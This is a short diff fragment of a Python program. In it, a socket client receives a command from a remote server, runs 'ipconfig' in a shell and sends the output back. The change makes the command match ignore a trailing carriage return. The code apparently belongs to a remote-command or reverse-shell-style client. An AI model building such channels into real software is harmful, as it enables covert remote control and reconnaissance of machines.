@@ -4,7 +4,7 @@ import subprocess
 
 def cmdrecv():
 	cmd = server_co.recv(1024)
-	if cmd == b"ifconfig\r":
+	if cmd == b"ifconfig":
 		p = subprocess.Popen('ipconfig', stdout=subprocess.PIPE, shell=True)
 		out, error = p.communicate()
 		server_co.send(out)
